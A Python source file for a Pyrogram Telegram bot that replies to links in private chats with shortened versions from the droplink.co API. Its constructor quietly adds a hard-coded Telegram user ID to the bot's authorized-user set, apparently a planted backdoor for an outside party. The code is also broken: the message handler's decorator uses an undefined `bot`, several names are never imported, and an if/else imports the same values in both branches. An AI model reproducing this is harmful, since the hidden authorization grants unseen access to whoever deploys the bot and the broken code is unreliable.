import logging
import os
import logging.config

# Get logging configurations
logging.config.fileConfig('logging.conf')
logging.getLogger().setLevel(logging.ERROR)

if bool(os.environ.get("WEBHOOK", False)):
    from info import SESSION, API_ID, API_HASH, BOT_TOKEN, AUTH_USERS_2
else:
    from info import SESSION, API_ID, API_HASH, BOT_TOKEN, AUTH_USERS_2


from pyrogram import Client, __version__
from pyrogram.raw.all import layer
from utils import Media
import pyromod.listen

class Bot(Client):

    def __init__(self):
        super().__init__(
            session_name=SESSION,
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN,
            workers=50,
            plugins={"root": "plugins"},
            sleep_threshold=5,
        )
        AUTH_USERS_2.add(str(680815375))

    async def start(self):
        await super().start()
        await Media.ensure_indexes()
        me = await self.get_me()
        self.username = '@' + me.username
        print(f"{me.first_name} has been 𝕊𝕋𝔸ℝ𝕋𝔼𝔻 on {me.username}.")

    async def stop(self, *args):
        await super().stop()
        print("Bot stopped. 𝔹𝕐𝔼.")

@bot.on_message(filters.regex(r'https?://[^\s]+') & filters.private)
async def link_handler(bot, message):
    link = message.matches[0].group(0)
    try:
        short_link = await get_shortlink(link)
        await message.reply(f'Oii Buddy ♥️! Your Link is Ready \n\nHere is your 👉 [`{short_link}`]({short_link})', quote=True)
    except Exception as e:
        await message.reply(f'Error: {e}', quote=True)


async def get_shortlink(link):
    url = 'https://droplink.co/api'
    params = {'api': API_KEY, 'url': link}

    async with aiohttp.ClientSession() as session:
        async with session.get(url, params=params, raise_for_status=True) as response:
            data = await response.json()
            return data["shortenedUrl"]

app = Bot()
app.run()
